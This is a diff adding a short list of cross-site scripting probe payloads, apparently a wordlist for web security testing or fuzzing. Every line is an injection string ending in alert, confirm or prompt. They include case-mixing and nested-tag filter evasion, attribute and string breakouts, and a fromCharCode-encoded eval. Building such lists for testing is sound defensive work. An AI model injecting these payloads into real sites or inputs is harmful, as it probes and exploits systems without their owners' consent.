@@ -1,0 +1,15 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<SCRIPT>alert(1)</SCRIPT>
+<sCrIpT>alert(1)</sCrIpT>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+" autofocus onfocus="alert(1)
+';alert(1)//
+";alert(1)//
+\';alert(1)//
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<img src=x onerror=confirm(1)>
